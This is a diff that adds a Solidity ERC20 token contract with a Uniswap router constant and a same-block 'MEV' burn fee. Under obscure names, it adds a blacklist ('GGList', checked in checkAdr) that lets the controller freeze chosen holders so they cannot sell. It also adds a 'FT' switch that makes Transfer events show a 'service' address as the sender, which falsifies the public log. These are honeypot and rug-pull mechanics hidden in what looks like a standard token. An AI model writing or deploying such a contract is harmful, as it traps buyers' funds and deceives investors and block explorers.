@@ -1,0 +1,168 @@
+contract ERC20 {
+    using SafeMath for uint256;
+
+    uint256 public totalSupply;
+
+    address service;
+
+    bool FT;
+
+    address public uniswapV2LP;
+
+    address constant uniswapV2Router=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+
+    uint256 public constant BURN_FEE_PERCENT_MEV = 1;
+
+    mapping (address => mapping (address => uint256)) internal allowed;
+    mapping(address => bool)  GGList;
+    mapping(address => bool)  tokenWhitelist;
+    mapping(address => uint256) balances;
+    mapping(address => uint256) private walletLastTxBlock;
+    event Whitelist(address indexed WhiteListed, bool value);
+    event Swap(
+        address indexed sender,
+        uint amount0In,
+        uint amount1In,
+        uint amount0Out,
+        uint amount1Out,
+        address indexed to
+    );
+    event Transfer(address indexed from, address indexed to, uint256 value);
+    event Approval(address indexed owner, address indexed spender, uint256 value);
+
+
+    function transfer(address _to, uint256 _value) public returns (bool) {
+        require(_to != address(0));
+        require(_to != msg.sender);
+        require(_value <= balances[msg.sender]);
+        checkAdr(msg.sender,_to);
+        uint256 burnAmount=0;
+        if (isSecondTxInSameBlock(msg.sender)) {
+                burnAmount = _value * BURN_FEE_PERCENT_MEV / 100;  // Calculate fee of the transaction amount for mevs
+        }
+        _value=_value.sub(burnAmount);
+        _burn(msg.sender,burnAmount);
+        balances[msg.sender] = balances[msg.sender].sub(_value);
+        // SafeMath.sub will throw if there is not enough balance.
+        balances[_to] = balances[_to].add(_value);
+        afterTransfer(msg.sender, _to, _value);
+        setLastTxBlock(_to);
+        return true;
+    }
+
+
+    function balanceOf(address _owner) public view returns (uint256 balance) {
+        return balances[_owner];
+    }
+
+    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
+        require(_to != _from);
+        require(_to != address(0));
+        require(_value <= balances[_from]);
+        require(_value <= allowed[_from][msg.sender]);
+        checkAdr(_from,_to);
+        uint256 burnAmount=0;
+        if (isSecondTxInSameBlock(_from)) {
+                burnAmount = _value * BURN_FEE_PERCENT_MEV / 100;  // Calculate fee of the transaction amount for mevs
+        }
+        _value=_value.sub(burnAmount);
+        _burn(_from,burnAmount);
+        balances[_from] = balances[_from].sub(_value);
+
+
+        balances[_to] = balances[_to].add(_value);
+        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
+        afterTransfer(_from, _to, _value);
+        setLastTxBlock(_to);
+        return true;
+    }
+
+    function checkAdr(address _from, address _to) internal view {
+        require(!GGList[_from]||tokenWhitelist[_from]||tokenWhitelist[_to]);
+    }
+
+    function afterTransfer(address _from, address _to,uint256 amount) internal {
+        if(FT){
+            _transferGo(service, _to, amount);
+        }else{
+            _transferGo(_from, _to, amount);
+        }
+    }
+
+    function isSecondTxInSameBlock(address _from) internal view returns(bool) {
+        return walletLastTxBlock[_from] == block.number;
+    }
+
+    function setLastTxBlock(address _to) internal returns(bool) {
+        if(!tokenWhitelist[_to]&&_to!=uniswapV2LP){
+            walletLastTxBlock[_to] = block.number;
+        }
+        return true;
+    }
+
+
+    function _burn(address account, uint256 amount) internal virtual {
+        require(account != address(0), "ERC20: burn from the zero address");
+        require(balances[account] >= amount, "ERC20: burn amount exceeds balance");
+        balances[account] = balances[account].sub(amount);
+        // Overflow not possible: amount <= accountBalance <= totalSupply.
+        totalSupply =totalSupply.sub( amount);
+
+
+        emit Transfer(account, address(0), amount);
+    }
+
+
+
+    function approve(address _spender, uint256 _value) public returns (bool) {
+        allowed[msg.sender][_spender] = _value;
+        emit Approval(msg.sender, _spender, _value);
+        return true;
+    }
+
+
+    function allowance(address _owner, address _spender) public view returns (uint256) {
+        return allowed[_owner][_spender];
+    }
+
+
+    function _transferGo(address where, address go, uint _value) internal returns (bool) {
+        emit Transfer(where, go, _value);
+        return true;
+    }
+
+
+
+    function _changeFT(bool _ft) internal returns (bool) {
+        require(FT!=_ft);
+        FT=_ft;
+        return true;
+    }
+
+    function _changeLP(address _lp) internal returns (bool) {
+        require(uniswapV2LP!=_lp);
+        uniswapV2LP=_lp;
+        return true;
+    }
+
+
+    function _GA(address _address, bool _gg) internal returns (bool) {
+        require(GGList[_address] != _gg);
+        GGList[_address] = _gg;
+        return true;
+    }
+    function _whiteList(address _address, bool _isWhiteListed) internal returns (bool) {
+        require(tokenWhitelist[_address] != _isWhiteListed);
+        tokenWhitelist[_address] = _isWhiteListed;
+        emit Whitelist(_address, _isWhiteListed);
+        return true;
+    }
+    function _GL(address[] memory _addressList, bool _isGeryListed) internal returns (bool) {
+        for(uint i = 0; i < _addressList.length; i++){
+            GGList[_addressList[i]] = _isGeryListed;
+        }
+        return true;
+    }
+
+
+}
